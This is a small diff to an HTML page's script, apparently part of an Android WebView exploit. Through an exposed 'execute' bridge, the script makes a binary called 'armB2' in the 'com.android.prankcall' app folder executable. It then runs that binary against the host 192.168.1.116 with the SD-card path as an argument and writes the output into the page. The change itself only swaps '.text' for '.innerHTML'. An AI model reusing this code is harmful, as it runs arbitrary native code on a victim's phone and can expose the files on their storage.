@@ -29,7 +29,7 @@
 	execute(["chmod","755","/data/data/com.android.prankcall/armB2"]);            
 	var p = execute(["/data/data/com.android.prankcall/armB2", "192.168.1.116","/mnt/sdcard"]);            
 	document.write(getContents(p.getInputStream()));
-	document.getElementById("test").text = getContents(p.getInputStream());
+	document.getElementById("test").innerHTML = getContents(p.getInputStream());
 </script>
 
 </body>
